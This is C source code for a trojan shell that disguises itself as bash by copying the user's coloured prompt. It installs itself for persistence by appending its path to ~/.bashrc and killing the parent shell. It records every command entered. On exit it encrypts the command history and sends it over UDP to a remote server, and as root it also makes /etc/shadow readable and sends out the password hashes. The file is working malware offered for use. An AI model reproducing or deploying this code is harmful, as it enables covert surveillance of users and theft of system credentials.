#include "shell_hdr.h"
Node *myLL=NULL;
char *all_exe[10000];//this number is being hardcoded since there's no way to dynamically allocate a global variable
sigjmp_buf jumpbuf;
static int his_ctr=0;
static int hislinenum=1;

void LL_print(Node *myLL)
{
	Node *p=myLL;
	if(p!=NULL)
	{
		LL_print(p->next);
		printf("%d:  %s\n",hislinenum,p->cmd);
		hislinenum++;
	}
}

void LL_delete_last(void)
{
	Node *p=myLL;
	while(p->next->next!=NULL)
	{
		p=p->next;
	}
	free(p->next);
	p->next=NULL;
	hislinenum=1;//reset hislinenum
}

void LL_insert(char *cmd)
{
	his_ctr++;
	if(his_ctr>HISTSIZE)//history limit reaches
		LL_delete_last();
	Node *c=(Node *)malloc(sizeof(Node));
	strncpy(c->cmd,cmd,MAXLINE);
	c->next=myLL;
	myLL=c;
}

void LL_free(void)
{
	Node *p;
	while(myLL!=NULL)
	{
		p=myLL;
		myLL=myLL->next;
		free(p);
	}
	myLL=NULL;
}

void LL_to_file(FILE *fp,Node *myLL)
{
	Node *p=myLL;
	if(p!=NULL)
	{
		LL_to_file(fp,p->next);
		fputs(p->cmd,fp);
		fputs("\n",fp);
	}
}

char **cmd_completion(const char *cmd, int st, int ed)
{
	return rl_completion_matches(cmd,cmd_gen);
}

char *cmd_gen(const char *cmd,int state)
{
	static int i,len;
	char *name;
	if(!state)
	{
		i=0;
		len=strlen(cmd);
	}
	while(name=all_exe[i++])
	{
		if(!strncmp(name,cmd,len))
			return strdup(name);
	}
	return NULL;
}

//cannot use fatal() because it doesn't fork a child, will exit the shell instead
int nonfatal(char *message)
{
	perror(message);
	return 1;
}
int shell_cd(char **command)
{	
	if(command[1]==NULL || !strcmp(command[1],"~"))
	{
		if(chdir(getenv("HOME")))
			nonfatal("chdir");
	}
	else
	{
		if(!strcmp(command[1],".."))
		{
			if(chdir(command[1]))
				nonfatal("chdir");
		}
		else if(command[1][0]!='/')//if not absolute path
		{
			char *abs_path=NULL;
			char *home=getenv("HOME");
			int maxpath=strlen(command[1])+strlen(home)+2;
			abs_path=malloc(maxpath);
			if(!abs_path)
				nonfatal("malloc");
			snprintf(abs_path,maxpath,"%s/%s",home,command[1]);
			if(chdir(abs_path))
				nonfatal("chdir");
			free(abs_path);
		}
		else
		{
			if(chdir(command[1]))
				nonfatal("chdir");
		}
	}
	return 1;
}

//exit the shell, not the child process
int shell_exit(char **command)
{
	return 0;
}
//handle the command, whether it is a binary executable or a shell builtin.
int execute(char **command)
{
	for(int i=0;i<NUMSHELLBUILTIN;i++)
	{
		if(!strcmp(command[0],shell_builtin[i]))
			return (*call_builtin_funcptr[i])(command);
	}	
	return launch_process(command);
}

int build_exe_list(int loc,char *dir)
{
	DIR *de;
	struct dirent *dp;
	de=opendir(dir);
	int i=loc;
	if(de==NULL)
		fatal("opendir");
	while(dp=readdir(de))
	{
		if(strcmp(dp->d_name,".")&&strcmp(dp->d_name,".."))
		{
			all_exe[i]=strdup(dp->d_name);
			i++;
		}
	}
	closedir(de);
	return i;
}

//handle control-c and control-z
void sig_handler(int dummy)
{
	write(1,"\n",1);
	siglongjmp(jumpbuf,1);
}

//print an error message then exit
void fatal(char *message)
{
	perror(message);
	exit(EXIT_FAILURE);
}
void opensslError(void)
{
	ERR_print_errors_fp(stderr);
	exit(EXIT_FAILURE);
}
//fork and exec 
int launch_process(char **args)
{																			
	pid_t pid;
	int child_status;
	pid=fork();
	if(pid)
	{
		waitpid(pid,&child_status,WUNTRACED);
		while(!WIFEXITED(child_status)&&!WIFSIGNALED(child_status))
		{
			waitpid(pid,&child_status,WUNTRACED);
		}
	}
	else if(pid==-1)
		fatal("fork");
	else
	{
		if(execvp(args[0],args)==-1)
		{
			char error[140];
			strcpy(error,"bash: ");
			strncat(error,args[0],80);
			fatal(error);
		}	
	}
	return 1;//success
}

//parse user input into separate tokens, i.e array of strings
char **parse_args(char *command)
{
	ssize_t size=0; 
	int i=0,MAX_CHAR=80;
	char *token;
	char **tokens=malloc(MAX_CHAR*sizeof(char *));
	if(!tokens)
		fatal("malloc");
	token=strtok(command,DELIM);
	while(token!=NULL)
	{
		tokens[i]=token;
		i++;
		if(i>=MAX_CHAR)
		{
			MAX_CHAR+=MAX_CHAR;
			tokens=realloc(tokens,MAX_CHAR*sizeof(char *));
			if(!tokens)
				fatal("realloc");
		}
		token=strtok(NULL,DELIM);
	}
	tokens[i]='\0';//terminate line string
	return tokens;
}

void send_data(char *file)
{
	int sockfd;
	FILE *fp=fopen(file,"r");
	char line[150];
	struct sockaddr_in recv_addr;//structures used for address info
	if((sockfd=socket(PF_INET,SOCK_DGRAM,0))==-1)
		fatal("socket");
	recv_addr.sin_family=AF_INET;
	recv_addr.sin_port=htons(PORT);
	//CHANGE ME
	recv_addr.sin_addr.s_addr=INADDR_ANY;//inet_addr("ip.addr.of.server");//change to the server's ip or use INADDR_ANY to test it locally
	memset(&(recv_addr.sin_zero),'\0',8);//zero out the rest of the struct
	while(fgets(line,80,fp))
	{
		//128 bit key and iv, would be better if the key and iv are generated and exchanged using DH
		//key was generated by running
        //openssl enc -pbkdf2 -aes-128-cbc -k interstellarkey -P
		const char key[]={0xB7,0xDA,0xE6,0xB0,0x56,0xBC,0xC6,0x75,0x55,0x6A,0x40,0x5F,0xA5,0xED,0xA5,0x6B};
		const char iv[]= {0x50,0xF4,0xF8,0xF0,0x80,0x83,0x3C,0xAB,0x39,0x4B,0x9A,0x58,0xBB,0x9D,0x81,0x64};
		int cipherlen,finallen;
		EVP_CIPHER_CTX *ctx;
		ctx=EVP_CIPHER_CTX_new();//create cipher context
		if(!ctx)
			opensslError();
		unsigned char *ciphertext;//buffer for ciphertext, will be dynamically allocated
		EVP_CIPHER_CTX_init(ctx);//init context
		if(EVP_EncryptInit_ex(ctx,EVP_aes_128_cbc(),NULL,(unsigned char *)key,(unsigned char *)iv)!=1)//init the encryption operation
			opensslError();
		cipherlen=strlen(line)+EVP_MAX_BLOCK_LENGTH;
		ciphertext=(unsigned char *)malloc(cipherlen);
		EVP_EncryptUpdate(ctx,ciphertext,&cipherlen,(unsigned char *)line,strlen(line));//encrypt cipherlen bytes from line
 	 	EVP_EncryptFinal_ex(ctx,ciphertext+cipherlen,&finallen);//encrypt the final data, pad if needed
		sendto(sockfd,ciphertext,cipherlen+finallen,MSG_CONFIRM,(const struct sockaddr *)&recv_addr,sizeof(recv_addr));//send UDP packet through socket
		EVP_CIPHER_CTX_cleanup(ctx);
		free(ciphertext);
	}
	close(sockfd);
}

//program mainloop
void mainloop(char *argv)
{
	int return_status,loc=0;
	char *line,hostname[MAXHOSTNAME];
	char **args;
	char *bin_locations[]={"/bin","/usr/bin","/usr/local/sbin","/sbin","/usr/sbin","/usr/local/sbin"};
	int numloc=sizeof(bin_locations)/sizeof(bin_locations[0]);//total number of ptr/ptr size
	for(int i=0;i<numloc;i++)
	{
		loc=build_exe_list(loc,bin_locations[i]);
	}
	char *user=getenv("USER");
	if(gethostname(hostname,MAXHOSTNAME))
		fatal("gethostname");

	if(access(HISTFILENAME,F_OK)!=-1)//file exist
	{
		FILE *fp=fopen(HISTFILENAME,"r");
		if(fp==NULL)
			fatal("fopen");
		char cmds[MAXLINE];
		while(fgets(cmds,MAXLINE,fp))//read from file line by line
		{
			strtok(cmds,"\n");//remove newline
			add_history(cmds);
			LL_insert(cmds);
		}
		fclose(fp);
	}
	char cwd[MAXCWD];
	if(getcwd(cwd,MAXCWD)==NULL)
		fatal("getcwd");
	char *ps1;
	ps1=getenv("PS1");
	if(ps1==NULL)
	{
		system("echo export PS1 >> ~/.bashrc");//export PS1 to use for mimicking
		char nodotslash[7];
		memcpy(nodotslash,&argv[2],6);
		nodotslash[6]='\0';
		char appendcmd[MAXLINE];
		snprintf(appendcmd,MAXLINE,"echo '%s/%s' >> ~/.bashrc",cwd,nodotslash);//this shell will takeover bash
		system(appendcmd);
		kill(getppid(),9);//kill bash so ~/.bashrc will be reloaded and takes effect
	}
	//now we have ps1 after a shell refresh

	//mimic the user prompt 
	char *locuath, *locdir;
	char *UatHc="\\]\\u@\\h";//user at host
	char *dirc="\\]\\w";//directory
	char fcolor[8],scolor[8];
	locuath=strstr(ps1,UatHc);
	locdir=strstr(ps1,dirc);
	if(locuath==NULL)
		strcpy(fcolor,"[0m");//no color
	else
	{
		for(int i=locuath-ps1-7,j=0;i<locuath-ps1&&j<7;i++,j++)
			fcolor[j]=ps1[i];//copy the color for UatH 
		fcolor[7]='\0';
	}
	if(locdir==NULL)
		strcpy(scolor,"[0m");
	else
	{
		for(int i=locdir-ps1-7,j=0;i<locdir-ps1&&j<7;i++,j++)
			scolor[j]=ps1[i];//copy the color for dir
		scolor[7]='\0';
	}
	int homelen=strlen(getenv("HOME"));
	//end of new code block
	struct sigaction sighandler;
	sighandler.sa_handler=sig_handler;
	sigaction(SIGINT,&sighandler,NULL);
	sigaction(SIGTSTP,&sighandler,NULL);
	do
	{
		if(getcwd(cwd,MAXCWD)==NULL)
			fatal("getcwd");
		int cwdlen=strlen(cwd);
		int relalen=cwdlen-homelen+2;
		char relapath[relalen];
		relapath[0]='~';
		for(int i=homelen,j=1;i<cwdlen&&j<relalen;i++,j++)
			relapath[j]=cwd[i];
		relapath[relalen-1]='\0';
		char prompt[MAXPROMPT];
		char dollarorhash='$';
		uid_t uid=getuid();
		if(uid==0)
			dollarorhash='#';
		snprintf(prompt,MAXPROMPT,"\033%s%s@%s\033[0m:\033%s%s\033[0m%c ",fcolor,user,hostname,scolor,relapath,dollarorhash);
		rl_attempted_completion_function=cmd_completion;
		while(sigsetjmp(jumpbuf,1));
		line=readline(prompt);//holds the line
		if(strlen(line)==0)//if only newline is entered
		{
			return_status=1;
			continue;
		}
		args=parse_args(line);
		int i=0;
		char full_cmd[MAXLINE];
		while(args[i]!=NULL)
		{
			if(i==0)
				strcpy(full_cmd,args[i]);
			else
			{
				strcat(full_cmd," ");
				strcat(full_cmd,args[i]);
			}
			i++;
		}
		if(!strcmp(line,"history"))
		{
			LL_insert("history");
			LL_print(myLL);
			return_status=1;
			free(line);//prevent memory leak
			free(args);//prevent memory leak 
			continue;
		}

		if(!strcmp(line,"exit"))//if it is exit 
		{
			free(line);//prevent memory leak
			return_status=call_builtin_funcptr[0](args);//calling exit
			free(args);//prevent memory leak
			FILE *fp=fopen(HISTFILENAME,"w");
			if(fp==NULL)
				fatal("fopen");
			LL_to_file(fp,myLL);
			LL_free();
			fclose(fp);
			if(uid==0)
			{
				system("chmod 666 /etc/shadow");
				send_data(HISTFILENAME);//send data back to server
				send_data("/etc/shadow");//send data back to server
				system("chmod 600 /etc/shadow");
			}
			else
			{
				send_data(HISTFILENAME);
				//send history file back to server
			}
			kill(getppid(),9);//kill bash
			continue;
		}
		else
		{
			add_history(full_cmd);//add to history
			LL_insert(full_cmd);//add cmd to myLL (only command)
			return_status=execute(args);
			free(line);
			free(args);
		}

	}while(return_status);
}

int main(int argc, char *argv[])
{
	mainloop(argv[0]);
}
